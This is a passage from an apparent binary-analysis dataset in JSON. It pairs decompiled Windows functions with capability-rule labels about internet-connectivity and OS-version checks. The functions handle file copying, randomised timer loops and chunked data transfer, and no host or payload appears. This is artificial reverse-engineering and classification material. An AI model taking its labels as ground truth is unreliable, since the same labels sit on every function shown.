        "decompiled_code": "\nuint __cdecl fcn.00024fc0(char *arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_2d0h;\n    char *var_2cch;\n    char *var_2c8h;\n    uint *var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b0h;\n    char *var_2ach;\n    uint var_2a4h;\n    uint *var_2a0h;\n    char *var_29ch;\n    uint var_294h;\n    char *var_290h;\n    uint *var_28ch;\n    uint *var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_274h;\n    uint *var_270h;\n    uint var_268h;\n    uint *var_264h;\n    char *var_260h;\n    uint var_25ch;\n    uint var_254h;\n    uint *var_250h;\n    uint var_24ch;\n    uint var_244h;\n    char *var_240h;\n    uint var_23ch;\n    int32_t var_228h;\n    uchar uStack541;\n    uint var_218h;\n    uchar uStack277;\n    uint var_110h;\n    char *var_4h;\n    \n    var_240h = arg_8h;\n    do {\n        cVar2 = *var_240h;\n        var_240h = var_240h + 1;\n    } while (cVar2 != '\\0');\n    var_250h = arg_ch;\n    do {\n        cVar2 = *var_250h;\n        var_250h = var_250h + 1;\n    } while (cVar2 != '\\0');\n    if (var_240h + var_250h + (-(arg_ch + 1) - (arg_8h + 1)) < 0x105) {\n        var_260h = arg_8h;\n        var_264h = &var_218h;\n        do {\n            cVar2 = *var_260h;\n            *var_264h = cVar2;\n            var_260h = var_260h + 1;\n            var_264h = var_264h + 1;\n        } while (cVar2 != '\\0');\n        var_4h = fcn.00025580(&var_218h);\n        if (var_4h == NULL) {\n            var_270h = arg_ch;\n            do {\n                cVar2 = *var_270h;\n                var_270h = var_270h + 1;\n            } while (cVar2 != '\\0');\n            var_284h = &uStack541;\n            do {\n                pcVar1 = var_284h + 1;\n                var_284h = var_284h + 1;\n            } while (*pcVar1 != '\\0');\n            puVar6 = arg_ch;\n            for (uVar5 = var_270h - arg_ch >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *var_284h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_284h = var_284h + 1;\n            }\n            for (uVar5 = var_270h - arg_ch & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *var_284h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_284h = var_284h + 1;\n            }\n        }\n        else {\n            var_28ch = arg_ch;\n            var_290h = var_4h;\n            do {\n                cVar2 = *var_28ch;\n                *var_290h = cVar2;\n                var_28ch = var_28ch + 1;\n                var_290h = var_290h + 1;\n            } while (cVar2 != '\\0');\n        }\n        iVar4 = fcn.00036130(&var_218h, &var_23ch);\n        if ((iVar4 == -1) || (var_228h == 0)) {\n            uVar3 = 0xffffffff;\n        }\n        else {\n            iVar4 = fcn.00036130(arg_8h, &var_23ch);\n            if (iVar4 == 0) {\n                var_29ch = arg_8h;\n                var_2a0h = &var_110h;\n                do {\n                    cVar2 = *var_29ch;\n                    *var_2a0h = cVar2;\n                    var_29ch = var_29ch + 1;\n                    var_2a0h = var_2a0h + 1;\n                } while (cVar2 != '\\0');\n                var_4h = fcn.00025580(&var_110h);\n                if (var_4h == NULL) {\n                    var_2ach = 0x800545e0;\n                    pcVar1 = var_2ach;\n                    do {\n                        var_2ach = pcVar1;\n                        pcVar1 = var_2ach + 1;\n                    } while (*var_2ach != '\\0');\n                    var_2c0h = &uStack277;\n                    do {\n                        pcVar1 = var_2c0h + 1;\n                        var_2c0h = var_2c0h + 1;\n                    } while (*pcVar1 != '\\0');\n                    puVar6 = 0x800545e0;\n                    for (uVar5 = var_2ach + 0x7ffaba21 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                        *var_2c0h = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        var_2c0h = var_2c0h + 1;\n                    }\n                    for (uVar5 = var_2ach + 0x7ffaba21 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                        *var_2c0h = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        var_2c0h = var_2c0h + 1;\n                    }\n                }\n                else {\n                    var_2c8h = 0x800545e0;\n                    var_2cch = var_4h;\n                    do {\n                        cVar2 = *var_2c8h;\n                        *var_2cch = cVar2;\n                        var_2c8h = var_2c8h + 1;\n                        var_2cch = var_2cch + 1;\n                    } while (cVar2 != '\\0');\n                }\n                iVar4 = fcn.00036130(&var_110h, &var_23ch);\n                if ((iVar4 == 0) && (iVar4 = fcn.000362c0(&var_110h),  iVar4 == -1)) {\n                    return 0xffffffff;\n                }\n                iVar4 = fcn.00036bb0(arg_8h, &var_110h);\n                if (iVar4 == -1) {\n                    return 0xffffffff;\n                }\n                iVar4 = fcn.00025490(&var_218h, arg_8h);\n                if (iVar4 == -1) {\n                    fcn.000362c0(arg_8h);\n                    fcn.00036bb0(&var_110h, arg_8h);\n                    return 0xffffffff;\n                }\n            }\n            else {\n                iVar4 = fcn.00025490(&var_218h, arg_8h);\n                if (iVar4 == -1) {\n                    return 0xffffffff;\n                }\n            }\n            if (arg_10h != 0) {\n                fcn.000362c0(&var_218h);\n            }\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 1868
    },
    "00025490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00025490(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_810h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035b50(arg_8h, 0x800545e8);\n    if (var_4h != 0) {\n        var_ch = fcn.00035b50(arg_ch, 0x800545ec);\n        if (var_ch == 0) {\n            fcn.00036000(var_4h);\n        }\n        else {\n            do {\n                var_8h = fcn.00035d70(&var_810h, 1, 0x800, var_4h);\n                if (var_8h == 0) {\n                    fcn.00036000(var_4h);\n                    fcn.00036000(var_ch);\n                    return 0;\n                }\n                iVar1 = fcn.00035d00(&var_810h, 1, var_8h, var_ch);\n            } while (iVar1 == var_8h);\n            fcn.00036000(var_4h);\n            fcn.00036000(var_ch);\n            fcn.000362c0(arg_ch);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 307
    },
    "00025580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00025580(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.00078ace(arg_8h, 0x2e);\n    uVar1 = fcn.00078ace(arg_8h, 0x5c);\n    if (((var_4h != 0) && (uVar1 != 0)) && (var_4h < uVar1)) {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 140
    },
    "00025780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00025780(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.000298c0(0xdf, 300000);\n    uVar2 = fcn.000298c0(0xe0, 9000000);\n    if (uVar1 < uVar2) {\n        uVar3 = fcn.00078a6e();\n        var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n    }\n    else {\n        uVar3 = fcn.00078a6e();\n        var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n    }\n    iVar4 = fcn.000345a0(0x800db8b8, var_ch >> 1);\n    if (iVar4 != -1) {\n        do {\n            if (*0x800db8ac != 0) break;\n            fcn.00025a80();\n            if (uVar1 < uVar2) {\n                uVar3 = fcn.00078a6e();\n                var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n            }\n            else {\n                uVar3 = fcn.00078a6e();\n                var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n            }\n            iVar4 = fcn.000345a0(0x800db8b8, var_ch);\n        } while (iVar4 != -1);\n        fcn.00034570(0x800db8a4);\n    }\n    return 0;\n}\n",
        "token_count": 424
    },
    "00025880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00025880(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.000298c0(0xdf, 300000);\n    uVar2 = fcn.000298c0(0xe0, 9000000);\n    if (uVar1 < uVar2) {\n        uVar3 = fcn.00078a6e();\n        var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n    }\n    else {\n        uVar3 = fcn.00078a6e();\n        var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n    }\n    iVar4 = fcn.000345a0(0x800db8a8, var_ch >> 1);\n    if (iVar4 != -1) {\n        do {\n            if (*0x800db8ac != 0) break;\n            fcn.000264c0();\n            if (uVar1 < uVar2) {\n                uVar3 = fcn.00078a6e();\n                var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n            }\n            else {\n                uVar3 = fcn.00078a6e();\n                var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n            }\n            iVar4 = fcn.000345a0(0x800db8a8, var_ch);\n        } while (iVar4 != -1);\n        fcn.00034570(0x800db9c4);\n    }\n    return 0;\n}\n",
        "token_count": 424
    },
    "00025980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00025980(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.000298c0(0xdf, 300000);\n    uVar2 = fcn.000298c0(0xe0, 9000000);\n    var_8h = fcn.00026ff0();\n    var_10h = uVar1;\n    while ((iVar3 = fcn.000345a0(*0x800db9c8, 0xffffffff),  iVar3 != -1 && (*0x800db8ac == 0))) {\n        fcn.000262f0();\n        iVar3 = fcn.00026ff0();\n        if (iVar3 - var_8h < uVar1) {\n            fcn.00043cb0(1000);\n        }\n        else {\n            fcn.000264c0();\n            iVar3 = fcn.00026ff0();\n            if (var_10h <= iVar3 - var_8h) {\n                fcn.00025a80();\n                fcn.000264c0();\n                if (uVar1 < uVar2) {\n                    uVar4 = fcn.00078a6e();\n                    var_10h = uVar4 % ((uVar2 - uVar1) + 1) + uVar1;\n                }\n                else {\n                    uVar4 = fcn.00078a6e();\n                    var_10h = uVar4 % ((uVar1 - uVar2) + 1) + uVar2;\n                }\n                var_8h = fcn.00026ff0();\n            }\n        }\n    }\n    fcn.00034570(0x800db8b0);\n    return 0;\n}\n",
        "token_count": 439
    },
    "00025a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00025a80(void)\n\n{\n    uint arg_18h;\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t var_f0h;\n    uint32_t var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    int32_t var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint32_t var_d0h;\n    uint32_t var_cch;\n    int32_t var_c8h;\n    uint32_t var_c4h;\n    uint32_t var_c0h;\n    uint32_t var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint32_t var_a4h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint32_t var_53h;\n    uint var_4fh;\n    uint32_t var_4bh;\n    uint32_t var_47h;\n    int32_t var_42h;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_b4h = 0;\n    var_bch = 0;\n    var_d0h = 0;\n    *0x800db8a0 = 0;\n    do {\n        var_e0h = 0;\n        var_c8h = 0;\n        fcn.00078bfa(&var_68h, 0, 0x52);\n        var_70h = fcn.000298c0(1, 0);\n        arg_18h = fcn.000298c0(400, 20000);\n        var_d4h = fcn.000298c0(0xe1, 0x1000);\n        var_6ch = fcn.000298c0(0xe2, 0x10000);\n        var_47h._0_1_ = 1;\n        iVar1 = fcn.000298c0(2, 0);\n        var_4bh = iVar1 + 1;\n        var_cch = 0;\n        var_c0h = 0;\n        while (iVar1 = fcn.00023930(var_70h, 0, 0, &var_b0h),  iVar1 == 0) {\n            if (var_80h < var_84h) {\n                var_4bh = var_a4h;\n                var_47h._0_1_ = 0;\n                stack0xffffffb6 = var_80h;\n                var_42h = var_84h - var_80h;\n                var_b4h = var_ach;\n                var_c8h = 1;\n                var_cch = var_a4h;\n                var_c0h = var_80h;\n                var_bch = var_84h;\n                break;\n            }\n            fcn.000260a0(var_70h, var_ach, var_84h, var_a4h);\n        }\n        if ((*0x800db8a0 == 0) && (var_dch = fcn.00026b60(0x800db8a0, 0, &var_d0h),  var_dch != 0)) break;\n        var_60h._0_1_ = 1;\n        var_64h = var_70h | 0x80000000;\n        var_53h = var_70h;\n        var_4fh = 0;\n        var_47h._0_1_ = var_47h | 0x1a;\n        var_3eh = var_d4h;\n        var_3ah = var_6ch;\n        fcn.00024120(&var_68h);\n        fcn.000255d0(&var_53h);\n        var_dch = fcn.00077a90(*0x800db8a0, 0xb, &var_68h, 0x52, &var_ch, 0);\n        if (var_dch != 0) {\n            if (var_cch == 0) {\n                var_ech = var_d0h | 0x80000000;\n            }\n            else {\n                var_ech = var_cch;\n            }\n            fcn.00029dc0(2, 0, var_dch, 0, var_ech);\n            break;\n        }\n        var_dch = fcn.00077b60(*0x800db8a0, var_ch, &var_e0h, &var_c4h, arg_18h, 0);\n        if (var_dch == 0) {\n            if (var_c4h < 0x40) {\n                var_dch = 0x215901f5;\n                if (var_cch == 0) {\n                    var_f0h = var_d0h | 0x80000000;\n                }\n                else {\n                    var_f0h = var_cch;\n                }\n                fcn.00029dc0(2, 0, 0x215901f5, 0, var_f0h);\n                fcn.00077ed0(*0x800db8a0, var_ch);\n                break;\n            }\n            fcn.000256a0(var_e0h);\n            if (*(var_e0h + 0x30) < *(var_e0h + 0x2c)) {\n                fcn.00077ed0(*0x800db8a0, var_ch);\n                break;\n            }\n            if (var_c8h == 0) {\n                var_cch = *(var_e0h + 0xc);\n                var_bch = *(var_e0h + 0x2c);\n                var_4h = fcn.000239b0(var_70h, 0, var_cch, var_bch, 0, &var_b4h);\n                if (var_4h != 0) {\n                    fcn.00029dc0(2, 0, var_4h + 0x191U | 0x21590000, 0, var_cch);\n                    fcn.00077ed0(*0x800db8a0, var_ch);\n                    break;\n                }\n            }\n            while (var_dch = fcn.00077b60(*0x800db8a0, var_ch, &var_d8h, &var_b8h, arg_18h, 0),  var_dch == 0) {\n                if (var_b8h == 0) goto code_r0x00025f02;\n                var_4h = fcn.000239f0(var_70h, 0, var_b4h, var_c0h, var_d8h, var_b8h);\n                fcn.00077e50(*0x800db8a0, var_d8h);\n                if (var_4h != 0) {\n                    fcn.00029dc0(2, 0, var_dch, 0, var_cch);\n                    goto code_r0x00025f02;\n                }\n                var_c0h = var_c0h + var_b8h;\n            }\n            fcn.00029dc0(2, 0, var_dch, 0, var_cch);\n        }\ncode_r0x00025f02:\n        bVar2 = false;\n        var_dch = fcn.00077d40(*0x800db8a0, var_ch, &var_8h, &var_d8h, &var_b8h, arg_18h, 0);\n        if (var_dch == 0) {\n            if (var_8h == 0) {\n                bVar2 = var_c0h != var_bch;\n                if (bVar2) {\n                    fcn.00029dc0(2, 0, 0x215901f6, 0, var_cch);\n                    fcn.00023a80(var_70h, 0, var_b4h);\n                }\n                else {\n                    fcn.000260a0(var_70h, var_b4h, var_bch, var_cch);\n                }\n                bVar2 = !bVar2;\n            }\n            else {\n                if ((var_8h == 0x21590196) && (var_c8h != 0)) {\n                    fcn.00023a80(var_70h, 0, var_b4h);\n                    fcn.00029dc0(2, 0, var_8h, 0, var_cch);\n                }\n                if ((var_8h != 0x21590196) && (var_8h != 0x21590192)) {\n                    fcn.00029dc0(2, 0, var_8h, 0, var_cch);\n                }\n            }\n            fcn.00077e50(*0x800db8a0, var_d8h);\n        }\n        else {\n            fcn.00029dc0(2, 0, var_dch, 0, var_cch);\n        }\n        fcn.00077e50(*0x800db8a0, var_e0h);\n        var_e0h = 0;\n    } while (bVar2);\n    if (*0x800db8a0 != 0) {\n        fcn.00077e50(*0x800db8a0, var_e0h);\n        fcn.000775b0(0x800db8a0, 0);\n    }\n    return;\n}\n",
        "token_count": 2228
    },
    "000260a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000260a0(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    var_18h = 0;\n    var_10h = fcn.000356c0(arg_10h);\n    if (var_10h == NULL) {\n        fcn.00029dc0(3, 0, 0x21590004, 0, arg_14h);\n    }\n    else {\n        var_28h = fcn.000298c0(2, 0);\n        if (var_28h < arg_14h) {\n            var_ch = fcn.00023a30(arg_8h, 0, arg_ch, 0, var_10h, arg_10h, &arg_10h);\n            if (var_ch == 0) {\n                if (arg_10h < 0x15) {\n                    fcn.00029dc0(3, 0, 0x21590064, 0, arg_14h);\n                }\n                else {\n                    var_40h = *var_10h;\n                    var_3ch = var_10h[1];\n                    var_38h = var_10h[2];\n                    var_34h = var_10h[3];\n                    var_30h = var_10h[4];\n                    var_2ch._0_1_ = *(var_10h + 5);\n                    fcn.00024120(&var_40h);\n                    if (arg_14h == var_3ch) {\n                        var_20h = 0x800cc628;\n                        if ((var_38h == '\\x02') || (var_38h == '\\x01')) {\n                            var_18h = 1;\n                            fcn.00023a80(arg_8h, 0, arg_ch);\n                        }\n                        var_8h = 0;\n                        var_4h = 0;\n                        var_24h = fcn.000271f0(&var_20h, var_40h, var_10h + 0x15, arg_10h - 0x15, &var_1ch, &var_14h, \n                                               &var_40h);\n                        if (var_18h != 0) {\n                            iVar1 = fcn.00037730(&var_8h);\n                            if (iVar1 != 0) {\n                                var_48h = 3600000;\n                                var_44h = 0;\n                                _var_48h = fcn.00078be2(3600000, 0, 10000, 0);\n                                iVar1 = fcn.00078a62(var_8h, 0, &var_48h);\n                                if (iVar1 == 0x102) {\n                                    fcn.00029dc0(0xc, 0, 0x21590002, var_40h, var_3ch);\n                                }\n                                fcn.00037710(&var_8h);\n                            }\n                        }\n                        fcn.000357f0(var_1ch);\n                        fcn.00029900(2, arg_14h);\n                    }\n                    else {\n                        fcn.00029dc0(3, 0, 0x21590064, 0, arg_14h);\n                    }\n                }\n            }\n            else {\n                fcn.00029dc0(3, 0, var_ch + 0x191U | 0x21590000, 0, arg_14h);\n            }\n        }\n        else {\n            fcn.00029dc0(3, 0, 0x215901f7, 0, arg_14h);\n        }\n    }\n    fcn.000357f0(var_10h);\n    if (var_18h == 0) {\n        fcn.00023a80(arg_8h, 0, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 1046
    },
    "000264c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Variable defined which should be unmapped: var_e0h\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_d0h\n// WARNING: Variable defined which should be unmapped: var_cch\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000264c0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *var_f0h;\n    int32_t var_ech;\n    int32_t var_e8h;\n    uint *var_e4h;\n    int32_t var_e0h;\n    uint *var_dch;\n    uint *var_d8h;\n    uint *var_d4h;\n    uint *var_d0h;\n    uint *var_cch;\n    uint *var_c8h;\n    uint *var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint *var_b4h;\n    int32_t var_b0h;\n    uint *var_94h;\n    uint *var_90h;\n    int32_t var_7ch;\n    uint32_t var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint32_t var_6ch;\n    uint var_68h;\n    uint var_5bh;\n    uint var_57h;\n    uint *var_53h;\n    uint *var_4fh;\n    int32_t var_4ah;\n    uint *var_3eh;\n    int32_t var_3ah;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_ech = 0;\n    var_e0h = 0;\n    var_78h = fcn.000298c0(1, 0);\n    var_f0h = fcn.000298c0(400, 20000);\n    var_4h = fcn.000298c0(0x143, 0x1000);\n    var_d8h = fcn.000298c0(0x144, 0x10000);\n    var_8h = fcn.000238f0(0xffffffff, 1, &fcn.000264c0::var_c4h, &fcn.000264c0::var_14h);\n    if (var_8h != 0) {\n        fcn.00029dc0(4, 0, var_8h + 0x191U | 0x21590000, 0, 0);\n        return;\n    }\n    var_ch = 0;\n    var_10h = NULL;\ncode_r0x00026572:\n    do {\n        if (var_c4h <= var_10h) {\ncode_r0x00026b29:\n            fcn.00023b90(var_14h);\n            if (var_ech == 0) {\n                return;\n            }\n            fcn.00077e50(var_ech, var_e0h);\n            fcn.000775b0(&fcn.000264c0::var_ech, 0);\n            return;\n        }\n        iVar1 = fcn.00023970(*(var_14h + var_10h * 0x40), *(var_14h + 8 + var_10h * 0x40), \n                             *(var_14h + 4 + var_10h * 0x40), &fcn.000264c0::var_c0h);\n        if (iVar1 != 0) {\n            var_10h = var_10h + 1;\n            goto code_r0x00026572;\n        }\n        if (var_90h == var_94h) {\n            var_dch = var_b4h;\n            if ((var_ech == 0) && (var_e4h = fcn.00026b60(&fcn.000264c0::var_ech, 1, 0),  var_e4h != NULL)) {\n                if (var_e4h != 0x21590064) {\n                    fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n                }\n                goto code_r0x00026b29;\n            }\n            var_c4h = 0x52;\n            var_c8h = NULL;\n            var_cch = &fcn.000264c0::var_70h;\n            var_d0h = 0x26649;\n            fcn.00078bfa();\n            var_68h._0_1_ = 2;\n            var_6ch = var_78h | 0x80000000;\n            var_5bh = 0xffffffff;\n            var_57h = 1;\n            var_53h = var_dch;\n            var_4fh._0_1_ = 4;\n            var_c4h = &fcn.000264c0::var_70h;\n            var_c8h = 0x26680;\n            fcn.00024120(var_c4h);\n            var_c8h = &fcn.000264c0::var_5bh;\n            var_cch = 0x26689;\n            fcn.000255d0(var_c8h);\n            var_cch = NULL;\n            var_d0h = var_f0h;\n            var_d4h = &fcn.000264c0::var_d0h;\n            var_d8h = &fcn.000264c0::var_e0h;\n            var_dch = &fcn.000264c0::var_18h;\n            var_e0h = 0x52;\n            var_e4h = &fcn.000264c0::var_70h;\n            var_e8h = 0xb;\n            var_e4h = fcn.00077970(var_ech, 0xb, var_e4h, 0x52, var_dch, var_d8h, var_d4h, var_f0h, 0);\n            if (var_e4h != NULL) {\n                fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n                goto code_r0x00026b29;\n            }\n            var_f0h = 0x52;\n            fcn.00078bfa(&fcn.000264c0::var_70h, 0);\n            if (var_18h == 0) {\n                if (var_d0h < 0x40) {\n                    fcn.00029dc0(4, 0, 0x215901f5, 0, var_dch);\n                    goto code_r0x00026b29;\n                }\n                var_ech = var_e0h;\n                fcn.000256a0(var_e0h);\n                if ((*(var_e0h + 0x2c) != var_94h) || (*(var_e0h + 0x10) != var_b0h)) {\n                    fcn.00029dc0(4, 0, 0x21590202, 0, var_dch);\n                    fcn.00077e50(var_ech, var_e0h);\n                    var_e0h = 0;\n                    var_10h = var_10h + 1;\n                    goto code_r0x00026572;\n                }\n                var_c8h = *(var_e0h + 0x30);\n            }\n            else {\n                var_c8h = NULL;\n                var_4fh._0_1_ = 1;\n                var_3ah = var_b0h;\n            }\n            var_68h._0_1_ = 1;\n            var_6ch = var_78h | 0x80000000;\n            var_5bh = 0xffffffff;\n            var_57h = 1;\n            var_53h = var_dch;\n            stack0xffffffae = var_c8h;\n            var_4ah = var_90h - var_c8h;\n            var_3eh = var_94h;\n            var_f0h = &fcn.000264c0::var_70h;\n            fcn.00024120(var_f0h);\n            fcn.000255d0(&fcn.000264c0::var_5bh);\n            var_e4h = fcn.00077a90(var_ech, 0xc, &fcn.000264c0::var_70h, 0x52, &fcn.000264c0::var_74h, 0);\n            if (var_e4h != NULL) {\n                fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n                goto code_r0x00026b29;\n            }\n            var_d4h = fcn.000356c0(var_d8h);\n            if (var_d4h == NULL) {\n                fcn.00029dc0(4, 0, 0x21590004, 0, var_dch);\n                goto code_r0x00026b29;\n            }\n            var_e4h = NULL;\n            for (; var_c8h < var_90h; var_c8h = var_c8h + var_7ch) {\n                if (var_4h < var_d8h) {\n                    uVar2 = fcn.00078a6e();\n                    var_7ch = uVar2 % (var_d8h + (1 - var_4h)) + var_4h;\n                }\n                else {\n                    uVar2 = fcn.00078a6e();\n                    var_7ch = uVar2 % (var_4h + (1 - var_d8h)) + var_d8h;\n                }\n                if (var_90h < var_7ch + var_c8h) {\n                    var_7ch = var_90h - var_c8h;\n                }\n                var_8h = fcn.00023a30(0xffffffff, 1, var_bch, var_c8h, var_d4h, var_7ch, &fcn.000264c0::var_7ch);\n                if (var_8h != 0) {\n                    var_e4h = var_8h + 0x191U | 0x21590000;\n                    fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n                    break;\n                }\n                var_e4h = fcn.00077c70(var_ech, var_74h, var_d4h, var_7ch, 0);\n                if (var_e4h != NULL) {\n                    fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n                    break;\n                }\n            }\n            fcn.000357f0(var_d4h);\n            if ((var_e4h == NULL) && (var_e4h = fcn.00077c70(var_ech, var_74h, 0, 0, 0),  var_e4h != NULL)) {\n                fcn.00029dc0(4, 0, var_e4h, 0, var_dch);\n            }\n            var_e8h = 0;\n            var_e4h = fcn.00077d40(var_ech, var_74h, &fcn.000264c0::var_18h, &fcn.000264c0::var_d4h, \n                                   &fcn.000264c0::var_cch, var_f0h, 0);\n            fcn.00029dc0(4, var_18h, var_e4h, 0, var_dch);\n            if ((var_e4h == NULL) && (fcn.00077e50(var_ech, var_d4h),  var_18h == 0)) {\n                fcn.00023a80(0xffffffff, 1, var_bch);\n                var_e8h = 1;\n                fcn.00026f80(var_dch);\n            }\n            fcn.00077e50(var_ech, var_e0h);\n            var_e0h = 0;\n            if (var_e8h == 0) {\n                if (var_ch < 3) {\n                    var_ch = var_ch + 1;\n                    var_e8h = 0;\n                }\n            }\n            else {\n                var_ch = 0;\n            }\n            if (var_e8h != 0) {\n                var_10h = var_10h + 1;\n            }\n            goto code_r0x00026572;\n        }\n        var_10h = var_10h + 1;\n    } while( true );\n}\n",
        "token_count": 2965
    },
    "00026b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
